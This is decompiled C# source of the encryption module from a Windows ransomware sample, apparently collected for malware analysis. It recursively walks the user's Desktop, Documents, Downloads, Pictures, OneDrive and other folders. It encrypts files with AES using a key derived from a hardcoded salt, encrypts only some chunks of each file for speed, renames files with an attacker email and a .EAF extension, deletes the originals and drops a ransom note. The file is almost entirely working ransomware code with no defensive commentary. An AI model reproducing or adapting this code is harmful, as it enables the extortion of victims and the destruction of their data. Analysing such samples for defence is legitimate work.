// Decompiled with JetBrains decompiler
// Type: Fast.ENC4
// Assembly: encoderdecryption@yandex.ru, Version=2.0.2.2, Culture=neutral, PublicKeyToken=null
// MVID: C353C6AA-D71D-41FD-A002-1E85FFB3A964
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32-d2c47b1c94e6beadbc222771e788e9dafe194c462760b0d16cd25cbc0a572a00.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Fast
{
  internal class ENC4
  {
    public static ENC4.EAFLocker EL;
    private static string EncryptPassword = Program.RndKey + Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D + Program.RndKey;

    public static void Start()
    {
      ENC4.EL = new ENC4.EAFLocker();
      new Thread((ThreadStart) (() => ENC4.LookForDirectories())).Start();
    }

    private static void LookForDirectories()
    {
      try
      {
        string location1 = "C:\\Users\\";
        string userName = Environment.UserName;
        string location2 = location1 + userName + "\\Desktop";
        string location3 = location1 + userName + "\\Links";
        string location4 = location1 + userName + "\\Contacts";
        string location5 = location1 + userName + "\\Desktop";
        string location6 = location1 + userName + "\\Documents";
        string location7 = location1 + userName + "\\Downloads";
        string location8 = location1 + userName + "\\Pictures";
        string location9 = location1 + userName + "\\Music";
        string location10 = location1 + userName + "\\OneDrive";
        string location11 = location1 + userName + "\\Saved Games";
        string location12 = location1 + userName + "\\Favorites";
        string location13 = location1 + userName + "\\Searches";
        string location14 = location1 + userName + "\\Videos";
        ENC4.encryptDirectory(location7);
        ENC4.encryptDirectory(location6);
        ENC4.encryptDirectory(location3);
        ENC4.encryptDirectory(location4);
        ENC4.encryptDirectory(location5);
        ENC4.encryptDirectory(location8);
        ENC4.encryptDirectory(location9);
        ENC4.encryptDirectory(location10);
        ENC4.encryptDirectory(location11);
        ENC4.encryptDirectory(location12);
        ENC4.encryptDirectory(location13);
        ENC4.encryptDirectory(location14);
        ENC4.encryptDirectory(location1);
        ENC4.encryptDirectory(location1 + userName);
        ENC4.encryptDirectory(location2);
      }
      catch
      {
      }
    }

    private static void encryptDirectory(string location)
    {
      try
      {
        string[] files = Directory.GetFiles(location);
        for (int index = 0; index < files.Length; ++index)
        {
          try
          {
            string extension = Path.GetExtension(files[index]);
            string fileName = Path.GetFileName(files[index]);
            if (Array.Exists<string>(Program.validExtensions, (Predicate<string>) (E => E != extension.ToLower())) && extension != ".EAF" && fileName != Program.droppedMessageTextbox && fileName != Program.processURL)
            {
              ENC4.EL.EnceyptFile(files[index]);
              File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
            }
          }
          catch
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(location))
          ENC4.encryptDirectory(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public class EAFLocker
    {
      public void EnceyptFile(string file)
      {
        try
        {
          string extension = Path.GetExtension(file);
          if (!(extension != ".EAF"))
            return;
          string encryptPassword = ENC4.EncryptPassword;
          string fileName = Path.GetFileName(file);
          string str = Path.GetDirectoryName(file) + "\\[" + Program.email1 + "][" + Program.UniqueID() + "]" + fileName + ".EAF";
          if (!this.Encrypt(file, str, encryptPassword) && extension != ".EAF")
          {
            try
            {
              File.Move(file, str);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }

      private bool Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
      {
        try
        {
          using (FileStream fileStream1 = new FileStream(inputFilePath, FileMode.Open))
          {
            using (FileStream fileStream2 = new FileStream(outputfilePath, FileMode.Create))
            {
              fileStream1.Position = 0L;
              using (Aes aes = Aes.Create())
              {
                byte[] salt = new byte[13]
                {
                  (byte) 73,
                  (byte) 118,
                  (byte) 97,
                  (byte) 110,
                  (byte) 32,
                  (byte) 77,
                  (byte) 101,
                  (byte) 100,
                  (byte) 118,
                  (byte) 101,
                  (byte) 100,
                  (byte) 101,
                  (byte) 118
                };
                using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, salt))
                {
                  aes.Mode = CipherMode.CBC;
                  aes.Padding = PaddingMode.PKCS7;
                  aes.Key = rfc2898DeriveBytes.GetBytes(32);
                  aes.IV = rfc2898DeriveBytes.GetBytes(16);
                  using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, aes.CreateEncryptor(), CryptoStreamMode.Write))
                  {
                    int count1 = 4096;
                    byte[] buffer = new byte[count1];
                    int num = 0;
                    int count2;
                    do
                    {
                      count2 = fileStream1.Read(buffer, 0, count1);
                      if (num <= 400000)
                        cryptoStream.Write(buffer, 0, count2);
                      else if (num >= 800000 && num <= 1200000)
                        cryptoStream.Write(buffer, 0, count2);
                      else if (num >= 1600000 && num <= 2000000)
                        cryptoStream.Write(buffer, 0, count2);
                      else
                        fileStream2.Write(buffer, 0, count2);
                      num += count2;
                    }
                    while (count2 != 0);
                    cryptoStream.Close();
                  }
                }
              }
              fileStream2.Close();
            }
            fileStream1.Close();
          }
          File.Delete(inputFilePath);
          return true;
        }
        catch (SystemException ex)
        {
          return false;
        }
      }
    }
  }
}
